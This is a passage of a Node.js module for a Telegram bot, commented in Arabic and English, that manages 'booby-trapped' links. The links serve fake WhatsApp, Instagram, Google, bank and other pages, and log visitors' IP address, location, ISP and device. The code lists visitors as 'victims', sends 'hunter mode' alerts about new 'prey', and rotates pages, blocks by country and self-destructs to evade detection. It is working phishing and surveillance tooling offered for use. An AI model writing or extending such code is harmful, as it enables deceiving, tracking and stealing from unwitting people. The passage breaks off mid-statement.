/**
 * ═══════════════════════════════════════════════════════════════
 *   نظام الميزات الجديد — يُضاف فوق index.js الأصلي
 *   New Features System — injected on top of existing index.js
 * ═══════════════════════════════════════════════════════════════
 */
'use strict';
const crypto = require('crypto');

module.exports = function initLinkFeatures(bot, app, linkMgr, ctx) {
  const {
    hostURL, BOT_OWNER, enrichIP, getIP,
    _addToBuf, incUserStat, isPremium, canUsePremium,
    settings, DEFAULT_FEATURES, stats, saveStats,
    notify, notifyPhoto, notifyLoc, fetch, mdEsc,
    handleLinkOpen,
    blockedOldLinks, saveBlockedOldLinks,
    linkMgmtAllowed, saveLinkMgmtAllowed,
    oldLinksDb,
  } = ctx;

  // Helper: check if user can manage a link.
  // Every user can manage their OWN links. BOT_OWNER can manage all.
  // linkMgmtAllowed members can manage anyone's links (admin grant).
  // كل مستخدم يستطيع إدارة روابطه الخاصة.
  // BOT_OWNER يدير كل شيء. linkMgmtAllowed = مشرفون يديرون أي رابط.
  function canManageLinks(uid, linkOwnerId) {
    if (uid === BOT_OWNER || linkMgmtAllowed.has(String(uid))) return true;
    if (linkOwnerId !== undefined && linkOwnerId !== null)
      return Number(uid) === Number(linkOwnerId);
    return false;
  }

  // ── In-memory state ────────────────────────────────────────────────────────
  const _passTokens   = new Map(); // token → { lid, expiry }
  const _nlState      = new Map(); // chatId → { type } — pending new-link type
  const _awaitAction  = new Map(); // chatId → { action, lid, msgId }
  const _confirmDel   = new Map(); // chatId → lid (pending delete confirm)

  /**
   * parseLid — يقبل معرّف الرابط المباشر أو الرابط الكامل
   * مثال: "abc123" أو "https://domain/c/abc123/BASE64==" كلاهما يعطي "abc123"
   */
  function parseLid(input) {
    if (!input) return null;
    const s = input.trim();
    // Extract lid from full tracking URL patterns: /c/LID/, /l/LID, /w/LID/
    const m = s.match(/\/(?:c|l|w|go|wa|dl|tt|ig|sn|yt|gn|bk|ct)\/([a-zA-Z0-9_-]+)/);
    if (m) return m[1];
    // Otherwise treat as raw lid
    return s;
  }

  /**
   * isOldStyleLink — يكشف الروابط القديمة (مُنشأة بـ /create)
   * في النظام القديم، المسار = chatId.toString(36) وهو رقم كبير مشفّر base36
   */
  function isOldStyleLink(lid) {
    if (!lid) return false;
    const n = parseInt(lid, 36);
    // Telegram user IDs are typically > 100000 and the base36 encoding is 7-10 chars
    return !isNaN(n) && n > 100000 && lid.length >= 4 && lid.length <= 12 && /^[a-z0-9]+$/.test(lid);
  }

  /**
   * parseOldStyleKey — يستخرج مفتاح "path|uri" من رابط قديم كامل
   * مثال: "https://host/c/2rfshtw/aHR0cHM..." → "2rfshtw|aHR0cHM..."
   */
  function parseOldStyleKey(input) {
    if (!input) return null;
    const s = input.trim();
    const m = s.match(/\/(?:c|w|wa|dl|tt|ig|sn|yt|gn|bk|ct)\/([a-zA-Z0-9_-]+)\/(.+)/);
    if (m) return `${m[1]}|${m[2]}`;
    return null;
  }

  // Clean expired pass tokens every minute
  setInterval(() => {
    const now = Date.now();
    for (const [k, v] of _passTokens) if (now > v.expiry) _passTokens.delete(k);
  }, 60_000);

  // ── Helpers ────────────────────────────────────────────────────────────────
  /** Block SSRF: reject localhost, link-local, and RFC-1918 private hosts */
  function isSafeUrl(url) {
    try {
      const h = new URL(url).hostname;
      if (/^(localhost|::1)$/i.test(h)) return false;
      if (/^(127\.|10\.|0\.)/.test(h))  return false;
      if (/^192\.168\./.test(h))         return false;
      if (/^172\.(1[6-9]|2\d|3[01])\./.test(h)) return false;
      if (/^169\.254\./.test(h))         return false;
      return true;
    } catch { return false; }
  }

  const TYPE_KEYBOARD = {
    inline_keyboard: [
      [{ text: '🌐 WebView',    callback_data: 'nl_t:webview'    },
       { text: '☁️ Cloudflare', callback_data: 'nl_t:cloudflare' }],
      [{ text: '💬 WhatsApp',   callback_data: 'nl_t:whatsapp'   },
       { text: '📷 Instagram',  callback_data: 'nl_t:instagram'  }],
      [{ text: '🎵 TikTok',     callback_data: 'nl_t:tiktok'     },
       { text: '🔵 Google',     callback_data: 'nl_t:google'     }],
      [{ text: '👻 Snapchat',   callback_data: 'nl_t:snapchat'   },
       { text: '▶️ YouTube',    callback_data: 'nl_t:youtube'    }],
      [{ text: '📥 Download',   callback_data: 'nl_t:download'   },
       { text: '🏦 Bank',       callback_data: 'nl_t:bank'       }],
    ]
  };

  function typeLabel(type) {
    const m = linkMgr.getTypeMeta(type);
    return `${m.emoji} ${m.label}`;
  }

  function statusIcon(link) {
    if (!link.active) return '🔴 معطل';
    if (link.expiry && Date.now() > link.expiry) return '⌛ منتهي';
    if (link.maxVisits && link.visits >= link.maxVisits) return '🔢 وصل للحد';
    return '🟢 نشط';
  }

  function timeAgo(ts) {
    const s = Math.floor((Date.now() - ts) / 1000);
    if (s < 60)   return `${s}ث`;
    if (s < 3600) return `${Math.floor(s/60)}د`;
    if (s < 86400)return `${Math.floor(s/3600)}س`;
    return `${Math.floor(s/86400)}ي`;
  }

  function formatExpiry(link) {
    if (!link.expiry) return 'لا يوجد';
    const r = link.expiry - Date.now();
    if (r <= 0) return '⌛ انتهى';
    const h = Math.floor(r / 3600000);
    const m = Math.floor((r % 3600000) / 60000);
    return h > 0 ? `${h}س ${m}د` : `${m}د`;
  }

  function linkInfoText(lid, link) {
    const m    = linkMgr.getTypeMeta(link.type);
    const lbl  = link.label ? `\n🏷️ *الاسم:* ${mdEsc ? mdEsc(link.label) : link.label}` : '';
    const al   = link.alias ? `\n🔤 *الاسم المخصص:* \`${link.alias}\`` : '';
    const pass = link.password ? '🔑 نعم' : 'لا';
    const hook = link.webhook  ? '✅ مفعّل' : 'لا';
    const topC = Object.entries(link.countries||{}).sort((a,b)=>b[1]-a[1]).slice(0,3).map(([c,n])=>`${c}(${n})`).join(' ') || '?';
    const linkUrl = `${hostURL}/l/${lid}`;
    return (
      `🔗 *إدارة الرابط* \`${lid}\`\n` +
      `${lbl}${al}\n` +
      `🎭 *النوع:* ${m.emoji} ${m.label}\n` +
      `📊 *الحالة:* ${statusIcon(link)}\n` +
      `👁️ *الزيارات:* ${link.visits} (${(link.uniqueIPs||[]).length} فريد)\n` +
      `📱 *موبايل/كمبيوتر:* ${link.devices?.mobile||0} / ${link.devices?.desktop||0}\n` +
      `🌍 *الدول:* ${topC}\n` +
      `📅 *أنشئ:* منذ ${timeAgo(link.createdAt)}\n` +
      `⏰ *ينتهي:* ${formatExpiry(link)}\n` +
      `🔢 *حد الزيارات:* ${link.maxVisits || 'لا يوجد'}\n` +
      `🔑 *كلمة سر:* ${pass}\n` +
      `🌐 *Webhook:* ${hook}\n` +
      `💣 *تدمير ذاتي:* ${link.selfDestruct ? '✅' : 'لا'}\n\n` +
      `🔗 \`${linkUrl}\``
    );
  }

  function linkInfoKeyboard(lid, link, uid) {
    const canManage = canManageLinks(uid, link.uid);
    const toggleBtn = link.active
      ? { text: '🔴 تعطيل الرابط', callback_data: canManage ? `lm:dis:${lid}` : 'lm:noperm' }
      : { text: '🟢 تفعيل الرابط',  callback_data: canManage ? `lm:en:${lid}`  : 'lm:noperm' };
    const passBtn = link.password
      ? { text: '🔑 تغيير كلمة السر', callback_data: `lm:pass:${lid}` }
      : { text: '🔑 إضافة كلمة سر',   callback_data: `lm:pass:${lid}` };
    const hookBtn = link.webhook
      ? { text: '🌐 تغيير Webhook',  callback_data: `lm:hook:${lid}` }
      : { text: '🌐 إضافة Webhook',  callback_data: `lm:hook:${lid}` };
    const deleteBtn = canManage
      ? { text: '🗑️ حذف الرابط', callback_data: `lm:del:${lid}` }
      : { text: '🔒 حذف (غير مصرّح)', callback_data: 'lm:noperm' };
    const ctryBtn = (link.blockedCountries || []).length
      ? { text: `🌍 حظر دول (${link.blockedCountries.length})`, callback_data: `lm:ctry:${lid}` }
      : { text: '🌍 حظر دولة',  callback_data: `lm:ctry:${lid}` };
    const randBtn = link.randomTypes
      ? { text: '🔄 صفحة دوّارة ✅', callback_data: `lm:rand:${lid}` }
      : { text: '🔄 صفحة دوّارة',    callback_data: `lm:rand:${lid}` };
    return JSON.stringify({ inline_keyboard: [
      [toggleBtn,                      { text: '👥 الضحايا',          callback_data: `lm:vict:${lid}` }],
      [{ text: '⏰ مدة الانتهاء',     callback_data: `lm:exp:${lid}`  },
       { text: '🔢 حد الزيارات',      callback_data: `lm:vis:${lid}`  }],
      [passBtn,                         hookBtn],
      [{ text: '🏷️ تسمية الرابط',    callback_data: `lm:label:${lid}`},
       { text: '📷 QR Code',           callback_data: `lm:qr:${lid}`   }],
      [{ text: '🚫 حظر IP',           callback_data: `lm:bip:${lid}`  },
       deleteBtn],
      [{ text: '💣 تدمير ذاتي',       callback_data: `lm:sd:${lid}`   },
       { text: '🔤 اسم مخصص',         callback_data: `lm:alias:${lid}` }],
      [{ text: '📊 إحصائيات مرئية',   callback_data: `lm:chart:${lid}`},
       ctryBtn],
      [randBtn,
       { text: '🎯 رابط الصياد',      callback_data: `lm:hunter:${lid}` }],
      [{ text: '🔗 نسخ الرابط',        callback_data: `lm:copy:${lid}` },
       { text: '◀️ رجوع للروابط',     callback_data: 'lm:list:0'      }],
    ]});
  }

  function myLinksPage(uid, page = 0, perPage = 5) {
    const all   = linkMgr.getUserLinks(uid);
    const oldLinks = (oldLinksDb && oldLinksDb[String(uid)]) || [];
    const total = all.length;
    const pages = Math.max(1, Math.ceil(total / perPage));
    const slice = all.slice(page * perPage, page * perPage + perPage);

    if (total === 0 && oldLinks.length === 0) {
      return {
        text: '📋 *روابطك*\n\nلا توجد روابط بعد! استخدم /newlink لإنشاء أول رابط.',
        kb: JSON.stringify({ inline_keyboard: [[{ text: '➕ إنشاء رابط', callback_data: 'nl_start' }]] }),
        md: 'Markdown',
      };
    }

    let text = `📋 *روابطك* (${total} رابط جديد`;
    if (oldLinks.length) text += ` + ${oldLinks.length} قديم`;
    text += `)\n\n`;
    const rows = [];

    if (total > 0) {
      slice.forEach((l, i) => {
        const idx  = page * perPage + i + 1;
        const meta = linkMgr.getTypeMeta(l.type);
        const lbl  = l.label ? ` — ${l.label}` : '';
        text += `${idx}. ${meta.emoji} \`${l.lid}\`${lbl}\n`;
        text += `   ${statusIcon(l)} • 👁️ ${l.visits} • 🕒 منذ ${timeAgo(l.createdAt)}\n\n`;
        rows.push([{ text: `⚙️ ${l.lid}${l.label ? ' — ' + l.label : ''}`, callback_data: `lm:info:${l.lid}` }]);
      });

      const nav = [];
      if (page > 0)         nav.push({ text: '◀️', callback_data: `lm:list:${page - 1}` });
      nav.push({ text: `${page + 1}/${pages}`, callback_data: 'lm:noop' });
      if (page < pages - 1) nav.push({ text: '▶️', callback_data: `lm:list:${page + 1}` });
      if (nav.length > 1) rows.push(nav);
    }

    if (oldLinks.length > 0) {
      if (total > 0) text += `━━━━━━━━━━━━━━━\n🗂️ *روابطك القديمة*\n\n`;
      else text += `🗂️ *روابطك القديمة*\n\n`;
      oldLinks.slice(0, 5).forEach((ol, i) => {
        const ago = timeAgo(ol.createdAt);
        text += `${i + 1}. 🛡️ \`${ol.cLink.split('/c/')[1] ? ol.cLink.split('/c/')[1].slice(0, 20) + '…' : '…'}\`\n`;
        text += `   🕒 منذ ${ago}\n\n`;
      });
      rows.push([{ text: '📋 عرض الروابط القديمة كاملة', callback_data: 'lm:oldlinks' }]);
    }

    rows.push([{ text: '➕ رابط جديد', callback_data: 'nl_start' }]);

    return { text, kb: JSON.stringify({ inline_keyboard: rows }), md: 'Markdown' };
  }

  // ── NEW LINK OPEN ROUTE  /l/:lid ───────────────────────────────────────────
  app.get('/l/:lid', async (req, res) => {
    const lid = req.params.lid;
    const ip  = getIP(req);

    // ── 1. Check link validity ──────────────────────────────────────────────
    const check = linkMgr.checkLink(lid);
    if (!check.ok) return res.render('linkoff', { reason: check.reason, host: hostURL });
    const link = check.link;

    // ── 2. IP block ─────────────────────────────────────────────────────────
    if (link.blockedIPs && link.blockedIPs.includes(ip)) {
      return res.redirect('https://www.google.com');
    }

    // ── 2b. Country block (checked after enrichIP async — use cached value) ──
    if (link.blockedCountries && link.blockedCountries.length) {
      try {
        const geoInfo = await enrichIP(ip);
        const country = geoInfo?.country || '';
        if (country && link.blockedCountries.some(c => c.toLowerCase() === country.toLowerCase())) {
          return res.redirect('https://www.google.com');
        }
      } catch (e) {}
    }

    // ── 3. Password gate ────────────────────────────────────────────────────
    if (link.password) {
      const pt  = req.query._pt;
      const ptd = pt ? _passTokens.get(pt) : null;
      const ok  = ptd && ptd.lid === lid && Date.now() < ptd.expiry;
      if (!ok) return res.render('linkpass', { lid, error: null, host: hostURL });
    }

    // ── 4. Record visit (stats + main notification handled by handleLinkOpen) ─
    enrichIP(ip).then(info => {
      linkMgr.recordVisit(lid, {
        ip, ua: req.headers['user-agent'] || '?',
        country: info?.country || '?',
        city:    info?.city    || '?',
        isp:     info?.isp     || '?',
      });
      // Append link label as extra buffer note (grouped with handleLinkOpen's notification)
      const lbl = link.label ? ` — ${link.label}` : '';
      _addToBuf(link.uid, ip, 'linkId', `🆔 رابط: \`${lid}\`${lbl}`);
    }).catch(() => {
      linkMgr.recordVisit(lid, { ip, ua: req.headers['user-agent'] || '?' });
    });

    // ── 5. Webhook (SSRF-safe) ──────────────────────────────────────────────
    if (link.webhook && isSafeUrl(link.webhook)) {
      fetch(link.webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lid, label: link.label, type: link.type,
          ip, ua: req.headers['user-agent'],
          time: new Date().toISOString(),
          visits: link.visits + 1,
        }),
      }).catch(() => {});
    }

    // ── 6. Render trap page ────────────────────────────────────────────────
    // Random page rotation — pick a random type on every visit
    let activeType = link.type;
    if (link.randomTypes) {
      const allTypes = Object.keys(linkMgr.TYPE_META || {});
      if (allTypes.length) activeType = allTypes[Math.floor(Math.random() * allTypes.length)];
    }
    const meta   = linkMgr.getTypeMeta(activeType);
    const view   = meta.view;
    const uid    = link.uid.toString(36);

    // Hunter mode — send extra-detail notification with full device fingerprint
    if (link.hunterMode) {
      enrichIP(ip).then(info => {
        const ua    = req.headers['user-agent'] || '?';
        const isMob = /mobile|android|iphone|ipad/i.test(ua);
        notify(link.uid,
          `🎯 *وضع الصياد — فريسة جديدة!*\n\n` +
          `🆔 الرابط: \`${lid}\`\n` +
          `⚓ IP: \`${ip}\`\n` +
          `${info ? `🌍 ${info.country} — ${info.city}\n📡 ${info.isp}\n` : ''}` +
          `📱 الجهاز: ${isMob ? 'موبايل' : 'كمبيوتر'}\n` +
          `🖥️ UA: \`${ua.slice(0, 100)}\`\n` +
          `👁️ زيارة رقم: *${(link.visits || 0) + 1}*`,
          { parse_mode: 'Markdown' }
        );
      }).catch(() => {});
    }
    const urlB64 = Buffer.from(link.url).toString('base64');

    req.params.path = uid;
    req.params.uri  = urlB64;
    req.params[0]   = urlB64;

    return handleLinkOpen(req, res, view);
  });

  // ── Password verification ──────────────────────────────────────────────────
  app.post('/l/:lid/verify', (req, res) => {
    const lid  = req.params.lid;
    const pass = (req.body.password || '').trim();
    const link = linkMgr.getLink(lid);
    if (!link || !link.password) return res.redirect(`/l/${lid}`);
    if (pass !== link.password)  return res.render('linkpass', { lid, error: '❌ كلمة السر خاطئة', host: hostURL });
    const token = crypto.randomBytes(20).toString('hex');
    _passTokens.set(token, { lid, expiry: Date.now() + 30 * 60 * 1000 });
    res.redirect(`/l/${lid}?_pt=${token}`);
  });

  // ── Alias route  /go/:alias ────────────────────────────────────────────────
  app.get('/go/:alias', (req, res) => {
    const lid = linkMgr.findByAlias(req.params.alias);
    if (!lid) return res.render('linkoff', { reason: 'not_found', host: hostURL });
    res.redirect(`/l/${lid}`);
  });

  // ── QR Code endpoint ────────────────────────────────────────────────────────
  app.get('/qr/:lid', (req, res) => {
    const url = `${hostURL}/l/${req.params.lid}`;
    res.redirect(`https://api.qrserver.com/v1/create-qr-code/?size=600x600&margin=20&data=${encodeURIComponent(url)}`);
  });

  // ── Live link stats API (for dashboards) ────────────────────────────────────
  app.get('/api/link/:lid/stats', (req, res) => {
    const link = linkMgr.getLink(req.params.lid);
    if (!link) return res.status(404).json({ ok: false });
    res.json({
      ok: true,
      visits: link.visits,
      unique: (link.uniqueIPs || []).length,
      active: link.active,
      countries: link.countries,
      devices: link.devices,
    });
  });

  // ══════════════════════════════════════════════════════════════════════════
  //   BOT — MESSAGE HANDLER
  // ══════════════════════════════════════════════════════════════════════════

  bot.on('message', async (msg) => {
    if (!msg?.chat) return;
    const chatId = msg.chat.id;
    const text   = msg.text || '';

    // ── Force-reply: new link URL input (reply OR state fallback) ────────────
    const _hasState = _nlState.has(chatId);
    const _isReply  = msg.reply_to_message?.text?.includes('🔗 أدخل الرابط المستهدف:');
    if ((_isReply || _hasState) && text && (text.startsWith('http') || _isReply)) {
      const state = _nlState.get(chatId);
      _nlState.delete(chatId);
      const type = state?.type || 'webview';
      const url  = text.trim();
      if (!url.startsWith('http')) {
        return bot.sendMessage(chatId, '⚠️ الرابط يجب أن يبدأ بـ http أو https');
      }
      const { lid, link: lnk } = linkMgr.createLink(chatId, type, url);
      const fullLink = `${hostURL}/l/${lid}`;
      const qrLink   = `${hostURL}/qr/${lid}`;
      const meta     = linkMgr.getTypeMeta(type);
      return bot.sendMessage(chatId,
        `✅ *تم إنشاء الرابط!*\n\n` +
        `🆔 *المعرّف:* \`${lid}\`\n` +
        `🎭 *النوع:* ${meta.emoji} ${meta.label}\n\n` +
        `🔗 *الرابط الملغم:*\n\`${fullLink}\`\n\n` +
        `📷 *QR Code:* ${qrLink}`,
        { parse_mode: 'Markdown',
          reply_markup: JSON.stringify({ inline_keyboard: [
            [{ text: '⚙️ إدارة الرابط', callback_data: `lm:info:${lid}` }],
            [{ text: '📷 QR Code',        callback_data: `lm:qr:${lid}`   },
             { text: '📋 روابطي',         callback_data: 'lm:list:0'      }],
          ]})
        }
      );
    }

    // ── Force-reply: link config actions ─────────────────────────────────────
    const pendingAction = _awaitAction.get(chatId);
    if (pendingAction && text) {
      try {
        const { action, lid } = pendingAction;
        const link = linkMgr.getLink(lid);
        _awaitAction.delete(chatId);
        if (!link) return bot.sendMessage(chatId, '❌ الرابط غير موجود.').catch(() => {});
        if (!canManageLinks(chatId, link?.uid)) return bot.sendMessage(chatId, '⛔ ليس لديك صلاحية هذا الإجراء.').catch(() => {});

        if (action === 'label') {
          linkMgr.updateLink(lid, chatId, { label: text.trim().slice(0, 50) });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ تم تسمية الرابط: *${text.trim()}*`);
        }
        if (action === 'expiry') {
          const hrs = parseInt(text);
          if (isNaN(hrs) || hrs < 0) return bot.sendMessage(chatId, '⚠️ أدخل عدداً صحيحاً من الساعات. (0 = إلغاء المدة)');
          if (hrs === 0) { linkMgr.updateLink(lid, chatId, { expiry: null }); return refreshLinkInfo(chatId, lid, pendingAction.msgId, '✅ تم إلغاء مدة الانتهاء.'); }
          linkMgr.updateLink(lid, chatId, { expiry: Date.now() + hrs * 3600000 });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ سينتهي الرابط بعد *${hrs} ساعة*`);
        }
        if (action === 'maxvisits') {
          const n = parseInt(text);
          if (isNaN(n) || n < 0) return bot.sendMessage(chatId, '⚠️ أدخل عدداً صحيحاً. (0 = إلغاء الحد)');
          if (n === 0) { linkMgr.updateLink(lid, chatId, { maxVisits: null }); return refreshLinkInfo(chatId, lid, pendingAction.msgId, '✅ تم إلغاء حد الزيارات.'); }
          linkMgr.updateLink(lid, chatId, { maxVisits: n });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ سيُعطَّل الرابط بعد *${n} زيارة*`);
        }
        if (action === 'password') {
          const pw = text.trim();
          if (pw === '0' || pw.toLowerCase() === 'off') {
            linkMgr.updateLink(lid, chatId, { password: null });
            return refreshLinkInfo(chatId, lid, pendingAction.msgId, '✅ تم إزالة كلمة السر.');
          }
          linkMgr.updateLink(lid, chatId, { password: pw });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ كلمة السر: \`${pw}\``);
        }
        if (action === 'webhook') {
          const wh = text.trim();
          if (wh === '0' || wh.toLowerCase() === 'off') {
            linkMgr.updateLink(lid, chatId, { webhook: null });
            return refreshLinkInfo(chatId, lid, pendingAction.msgId, '✅ تم إلغاء Webhook.');
          }
          if (!wh.startsWith('http') || !isSafeUrl(wh))
            return bot.sendMessage(chatId, '⚠️ الرابط غير صحيح. يجب أن يكون رابطاً خارجياً (https://...).');
          linkMgr.updateLink(lid, chatId, { webhook: wh });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ Webhook: \`${wh}\``);
        }
        if (action === 'blockip') {
          linkMgr.blockIP(lid, chatId, text.trim());
          return refreshLinkInfo(chatId, lid, pendingAction.msgId, `✅ تم حظر IP: \`${text.trim()}\``);
        }
        if (action === 'alias') {
          const al = text.trim().replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 30);
          if (!al) return bot.sendMessage(chatId, '⚠️ الاسم المخصص يجب أن يحتوي على أحرف/أرقام فقط.');
          linkMgr.updateLink(lid, chatId, { alias: al });
          return refreshLinkInfo(chatId, lid, pendingAction.msgId,
            `✅ يمكن الوصول للرابط عبر:\n\`${hostURL}/go/${al}\``);
        }
        if (action === 'blockctry') {
          // link.countries / link.blockedCountries store full country names (e.g. "Saudi Arabia"),
          // matching what enrichIP() returns — keep that convention here for consistency.
          const name = text.trim();
          if (!name) return bot.sendMessage(chatId, '⚠️ أدخل اسم الدولة (مثال: Saudi Arabia)');
          const blocked = [...(link.blockedCountries || [])];
          const idx = blocked.findIndex(c => c.toLowerCase() === name.toLowerCase());
          if (idx >= 0) { blocked.splice(idx, 1); }
          else { blocked.push(name); }
          linkMgr.updateLink(lid, chatId, { blockedCountries: blocked });
          const isBlocked = idx < 0;
          return bot.sendMessage(chatId, isBlocked ? `🚫 تم حظر ${name}` : `✅ تم رفع حظر ${name}`);
        }
      } catch (e) {
        console.error('link _awaitAction error:', e);
        bot.sendMessage(chatId, '❌ حدث خطأ غير متوقع، حاول مرة أخرى.').catch(() => {});
      }
      return;
    }

    // ── /newlink — new enhanced link creation ─────────────────────────────────
    if (text === '/newlink') {
      return bot.sendMessage(chatId,
        '🔗 *إنشاء رابط ملغم جديد*\n\nاختر نوع الصفحة المزيفة:',
        { parse_mode: 'Markdown', reply_markup: JSON.stringify(TYPE_KEYBOARD) }
      );
    }

    // ── /mylinks — paginated link list ────────────────────────────────────────
    if (text === '/mylinks') {
      const { text: t, kb, md } = myLinksPage(chatId, 0);
      return bot.sendMessage(chatId, t, { parse_mode: md || 'Markdown', reply_markup: kb });
    }

    // ── /linkstats <lid> ───────────────────────────────────────────────────────
    if (text.startsWith('/linkstats')) {
      const lid  = text.split(' ')[1];
      if (!lid) return bot.sendMessage(chatId, '⚠️ الاستخدام: /linkstats [معرّف الرابط]');
      const link = linkMgr.getLink(lid);
      if (!link) return bot.sendMessage(chatId, '❌ الرابط غير موجود.');
      if (!canManageLinks(chatId, link.uid)) return bot.sendMessage(chatId, '⛔ هذا الرابط ليس لك.');
      return bot.sendMessage(chatId, linkInfoText(lid, link),
        { parse_mode: 'Markdown', reply_markup: linkInfoKeyboard(lid, link, chatId) });
    }

    // ── /victims <lid> ─────────────────────────────────────────────────────────
    if (text.startsWith('/victims')) {
      const lid  = text.split(' ')[1];
      if (!lid) return bot.sendMessage(chatId, '⚠️ الاستخدام: /victims [معرّف الرابط]');
      const link = linkMgr.getLink(lid);
      if (!link) return bot.sendMessage(chatId, '❌ الرابط غير موجود.');
      if (!canManageLinks(chatId, link.uid)) return bot.sendMessage(chatId, '⛔ هذا الرابط ليس لك.');
      const vs = (link.victims || []).slice(-10).reverse();
      if (!vs.length) return bot.sendMessage(chatId, '👁️ لا توجد زيارات بعد.');
      let out = `👥 *آخر الزيارات — \`${lid}\`*\n\n`;
      vs.forEach((v, i) => {
        out += `${i + 1}\\. ${v.device} \`${v.ip}\`\n`;
        out += `   🌍 ${v.country} ${v.city} • 📡 ${v.isp}\n`;
        out += `   🕒 ${v.time.slice(0, 16).replace('T', ' ')}\n\n`;
      });
      return bot.sendMessage(chatId, out, { parse_mode: 'MarkdownV2' });
    }

    // ── /disablelink <lid|url> ─────────────────────────────────────────────────
    if (text.startsWith('/disablelink')) {
      const raw = text.split(' ').slice(1).join(' ').trim();
      const lid = parseLid(raw);
      if (!lid) return bot.sendMessage(chatId, '⚠️ الاستخدام: /disablelink [معرّف الرابط أو الرابط الكامل]');
      const _lnk = linkMgr.getLink(lid);
      const _disOldOwner = isOldStyleLink(lid) ? parseInt(lid, 36) : null;
      const _disEffUid = _lnk?.uid ?? _disOldOwner;
      if (!canManageLinks(chatId, _disEffUid)) return bot.sendMessage(chatId, `⛔ ليس لديك صلاحية تعطيل هذا الرابط.`);
      const ok = linkMgr.setActive(lid, null, false);
      if (ok) return bot.sendMessage(chatId, `🔴 تم تعطيل الرابط \`${lid}\``, { parse_mode: 'Markdown' });
      if (isOldStyleLink(lid)) {
        const oldKey = parseOldStyleKey(raw);
        if (oldKey) {
          if (blockedOldLinks.has(oldKey)) return bot.sendMessage(chatId, `🔴 الرابط القديم معطَّل مسبقاً.`, { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '🟢 إعادة التفعيل', callback_data: `old:en:${Buffer.from(oldKey).toString('base64').slice(0,40)}` }]] }) });
          blockedOldLinks.add(oldKey);
          saveBlockedOldLinks();
          return bot.sendMessage(chatId, `🔴 تم تعطيل الرابط القديم بنجاح.\nالزوار الجدد لن يروا المحتوى.`, { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '🟢 إعادة التفعيل', callback_data: `old:en:${Buffer.from(oldKey).toString('base64').slice(0,40)}` }, { text: '🗑️ حذف نهائي', callback_data: `old:del:${Buffer.from(oldKey).toString('base64').slice(0,40)}` }]] }) });
        }
        return bot.sendMessage(chatId, `⚠️ لتعطيل رابط قديم، أرسل الرابط الكامل وليس فقط المعرّف.\n\nمثال: /disablelink https://...`);
      }
      return bot.sendMessage(chatId, `❌ الرابط غير موجود.\n\n💡 تأكد من المعرّف الصحيح عبر /mylinks`, { parse_mode: 'Markdown' });
    }

    // ── /enablelink <lid|url> ──────────────────────────────────────────────────
    if (text.startsWith('/enablelink')) {
      const raw = text.split(' ').slice(1).join(' ').trim();
      const lid = parseLid(raw);
      if (!lid) return bot.sendMessage(chatId, '⚠️ الاستخدام: /enablelink [معرّف الرابط أو الرابط الكامل]');
      const _lnk = linkMgr.getLink(lid);
      const _enOldOwner = isOldStyleLink(lid) ? parseInt(lid, 36) : null;
      const _enEffUid = _lnk?.uid ?? _enOldOwner;
      if (!canManageLinks(chatId, _enEffUid)) return bot.sendMessage(chatId, `⛔ ليس لديك صلاحية تفعيل هذا الرابط.`);
      const ok = linkMgr.setActive(lid, null, true);
      if (ok) return bot.sendMessage(chatId, `🟢 تم تفعيل الرابط \`${lid}\``, { parse_mode: 'Markdown' });
      if (isOldStyleLink(lid)) {
        const oldKey = parseOldStyleKey(raw);
        if (oldKey) {
          if (!blockedOldLinks.has(oldKey)) return bot.sendMessage(chatId, `🟢 الرابط القديم مفعَّل أصلاً.`, { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '🔴 تعطيل الرابط', callback_data: `old:dis:${Buffer.from(oldKey).toString('base64').slice(0,40)}` }]] }) });
          blockedOldLinks.delete(oldKey);
          saveBlockedOldLinks();
          return bot.sendMessage(chatId, `🟢 تم إعادة تفعيل الرابط القديم بنجاح.`, { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '🔴 تعطيل مجدداً', callback_data: `old:dis:${Buffer.from(oldKey).toString('base64').slice(0,40)}` }]] }) });
        }
        return bot.sendMessage(chatId, `⚠️ لتفعيل رابط قديم، أرسل الرابط الكامل وليس فقط المعرّف.\n\nمثال: /enablelink https://...`);
      }
      return bot.sendMessage(chatId, `❌ الرابط غير موجود.\n\n💡 تأكد من المعرّف الصحيح عبر /mylinks`, { parse_mode: 'Markdown' });
    }

    // ── /deletelink <lid|url> ──────────────────────────────────────────────────
    if (text.startsWith('/deletelink')) {
      const raw = text.split(' ').slice(1).join(' ').trim();
      const lid = parseLid(raw);
      if (!lid) return bot.sendMessage(chatId, '⚠️ الاستخدام: /deletelink [معرّف الرابط أو الرابط الكامل]');
      const _dlnk = linkMgr.getLink(lid);
      const _delOldOwner = isOldStyleLink(lid) ? parseInt(lid, 36) : null;
      const _delEffUid = _dlnk?.uid ?? _delOldOwner;
      if (!canManageLinks(chatId, _delEffUid)) return bot.sendMessage(chatId, `⛔ ليس لديك صلاحية حذف هذا الرابط.`);
      const ok = linkMgr.deleteLink(lid, null);
      if (ok) return bot.sendMessage(chatId, `🗑️ تم حذف الرابط \`${lid}\``, { parse_mode: 'Markdown' });
      if (isOldStyleLink(lid)) {
        const oldKey = parseOldStyleKey(raw);
        if (oldKey) {
          blockedOldLinks.add(oldKey);
          saveBlockedOldLinks();
          return bot.sendMessage(chatId, `🗑️ تم تعطيل الرابط القديم نهائياً.\nلا يمكن حذفه من القاعدة (لأنه لم يُخزَّن أصلاً) لكنه أُغلق ولن يعمل بعد الآن.`);
        }
        return bot.sendMessage(chatId, `⚠️ لحذف/تعطيل رابط قديم، أرسل الرابط الكامل وليس فقط المعرّف.\n\nمثال: /deletelink https://...`);
      }
      return bot.sendMessage(chatId, `❌ الرابط غير موجود.\n\n💡 تأكد من المعرّف الصحيح عبر /mylinks`, { parse_mode: 'Markdown' });
    }

    // ── /linkscount (admin) ────────────────────────────────────────────────────
    if (text === '/linkscount' && chatId === BOT_OWNER) {
      const gs = linkMgr.globalStats();
      return bot.sendMessage(chatId,
        `📊 *إحصائيات الروابط الكلية*\n\n` +
        `🔗 الإجمالي: *${gs.total}*\n` +
